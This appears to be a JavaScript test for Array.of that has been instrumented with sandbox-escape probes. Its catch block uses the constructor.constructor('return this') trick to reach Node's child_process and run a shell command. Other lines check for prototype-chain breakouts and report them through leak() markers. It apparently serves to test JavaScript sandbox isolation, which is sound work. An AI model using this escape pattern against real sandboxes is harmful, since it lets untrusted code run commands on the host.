try {
    var a1 = Array.of('Mike', 'Rick', 'Leo');
    assert.sameValue(a1.length, 3, 'The new array length is the same as the arguments size');
    assert.sameValue(a1[0], 'Mike', 'set each property in order - #1');
    assert.sameValue(a1[1], 'Rick', 'set each property in order - #2');
    assert.sameValue(a1[2], 'Leo', 'set each property in order - #3');
    var a2 = Array.of(undefined, false, null, undefined);
    assert.sameValue(a2.length, 4, 'Creates an array from the arguments, regarless of their type values');
    assert.sameValue(a2[0], undefined, 'set each property in order - #1');
    assert.sameValue(a2[1], false, 'set each property in order - #2');
    assert.sameValue(a2[2], null, 'set each property in order - #3');
    assert.sameValue(a2[3], undefined, 'set each property in order - #4');
    var a3 = Array.of();
    assert.sameValue(a3.length, 0, 'Array.of() returns an empty array');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}